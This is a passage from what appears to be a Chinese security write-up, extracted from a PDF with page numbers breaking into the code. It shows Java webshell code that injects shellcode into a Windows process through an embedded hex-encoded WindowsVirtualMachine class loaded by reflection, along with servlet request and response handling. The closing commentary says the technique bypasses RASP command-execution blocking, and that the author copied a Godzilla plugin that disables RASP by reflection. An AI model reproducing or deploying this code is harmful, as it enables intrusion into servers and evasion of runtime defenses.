 41         }
 42         try {
 43             response.getWriter().print(tag_s + output.toString() 
+ tag_e);
 44         } catch (Exception ignored) {
 45         }
 46         return true;
7
 47     }
 48
 49     public String loadShellCode(String shellcodeHex, String spi
d) throws Exception {
 50         int pid = Integer.parseInt(spid);
 51         byte[] shellcode = hexStrToByteArray(shellcodeHex);
 52         String clazzName = "sun.tools.attach.WindowsVirtualMachi
ne";
 53         Class WindowsVirtualMachineClazz;
 54         try {
 55             WindowsVirtualMachineClazz = Class.forName(clazzNam
e);
 56         } catch (ClassNotFoundException e) {
 57             byte[] classBytes = hexStrToByteArray("cafebabe00000
031002401002673756e2f746f6f6c732f6174746163682f57696e646f7773566
9727475616c4d616368696e650700010100106a6176612f6c616e672f4f626a6
5637407000301001a57696e646f77735669727475616c4d616368696e652e6a6
176610100063c696e69743e0100032829560c000600070a00040008010004746
869730100284c73756e2f746f6f6c732f6174746163682f57696e646f7773566
9727475616c4d616368696e653b010004696e697401000b6f70656e50726f636
573730100042849294a0100136a6176612f696f2f494f457863657074696f6e0
7000f01000c636c6f736550726f63657373010004284a2956010007656e71756
5756501003d284a5b424c6a6176612f6c616e672f537472696e673b4c6a61766
12f6c616e672f537472696e673b5b4c6a6176612f6c616e672f4f626a6563743
b29560100083c636c696e69743e0100066174746163680800160100106a61766
12f6c616e672f53797374656d07001801000b6c6f61644c69627261727901001
5284c6a6176612f6c616e672f537472696e673b29560c001a001b0a0019001c0
c000c00070a0002001e010004436f64650100124c6f63616c5661726961626c6
55461626c6501000a457863657074696f6e7301000a536f7572636546696c650
0210002000400000000000600010006000700010020000000230001000100000
0052ab70009b10000000100210000000c000100000005000a000b00000109000
c000700000109000d000e0001002200000004000100100109001100120001002
2000000040001001001890013001400010022000000040001001000080015000
7000100200000001500010000000000091217b8001db8001fb10000000000010
023000000020005");
 58             //  这种写法第⼆次执⾏会提示重复加载dll
 59             //  WindowsVirtualMachineClazz = this.defineClass(cl
azzName, classBytes, 0, classBytes.length);
 60             Method defineClass = Class.forName("java.lang.ClassL
oader").getDeclaredMethod("defineClass", byte[].class, int.clas
8
s, int.class);
 61             defineClass.setAccessible(true);
 62             WindowsVirtualMachineClazz = (Class) defineClass.inv
oke(ClassLoader.getSystemClassLoader(), classBytes, 0, classByte
s.length);
 63         }
 64         Method openProcessM = WindowsVirtualMachineClazz.getDecl
aredMethod("openProcess", int.class);
 65         openProcessM.setAccessible(true);
 66         Object hProcess = openProcessM.invoke(null, pid);
 67         Method enqueueM = WindowsVirtualMachineClazz.getDeclared
Method("enqueue", long.class, byte[].class, String.class, Strin
g.class, Object[].class);
 68         enqueueM.setAccessible(true);
 69         enqueueM.invoke(null, hProcess, shellcode, null, null, n
ew Object[]{});
 70         return "Success";
 71     }
 72
 73     private static String getCurrentPID() {
 74         String name = ManagementFactory.getRuntimeMXBean().getNa
me();
 75         String pid = name.split("@")[0];
 76         return pid;
 77     }
 78
 79     public static byte[] hexStrToByteArray(String str) {
 80         if (str == null) {
 81             return null;
 82         } else if (str.length() == 0) {
 83             return new byte[0];
 84         } else {
 85             byte[] byteArray = new byte[str.length() / 2];
 86
 87             for (int i = 0; i < byteArray.length; ++i) {
 88                 String subStr = str.substring(2 * i, 2 * i + 2);
 89                 byteArray[i] = (byte) Integer.parseInt(subStr, 1
6);
 90             }
 91             return byteArray;
9
 92         }
 93     }
 94
 95     public void parseObj(Object obj) {
 96         if (obj.getClass().isArray()) {
 97             Object[] data = (Object[]) obj;
 98             request = (HttpServletRequest) data[0];
 99             response = (HttpServletResponse) data[1];
100         } else {
101             try {
102                 Class clazz = Class.forName("javax.servlet.jsp.P
ageContext");
103                 request = (HttpServletRequest) clazz.getDeclared
Method("getRequest").invoke(obj);
104                 response = (HttpServletResponse) clazz.getDeclar
edMethod("getResponse").invoke(obj);
105             } catch (Exception e) {
106                 if (obj instanceof HttpServletRequest) {
107                     request = (HttpServletRequest) obj;
108                     try {
109                         Field req = request.getClass().getDeclar
edField("request");
110                         req.setAccessible(true);
111                         HttpServletRequest request2 = (HttpServl
etRequest) req.get(request);
112                         Field resp = request2.getClass().getDecl
aredField("response");
113                         resp.setAccessible(true);
114                         response = (HttpServletResponse) resp.ge
t(request2);
115                     } catch (Exception ex) {
116                         try {
117                             response = (HttpServletResponse) req
uest.getClass().getDeclaredMethod("getResponse").invoke(obj);
118                         } catch (Exception ignored) {
119
120                         }
121                     }
122                 }
123             }
10
其实注⼊Shellcode还可以⽤于绕过RASP的命令执⾏拦截，因为RASP拦截的只是Java层⾯的东⻄，进⼊
到native层⾯就⽆能为⼒了。
但是实际上根本不⽤这么麻烦，哥斯拉有⼀个绕过RASP的插件，利⽤反射直接把RASP的开关给关掉了，
可以实现⼀键Bypass。当然，这个功能也被我抄了过来，哥斯拉⽜逼就完事了
124         }
125     }
126 }
最后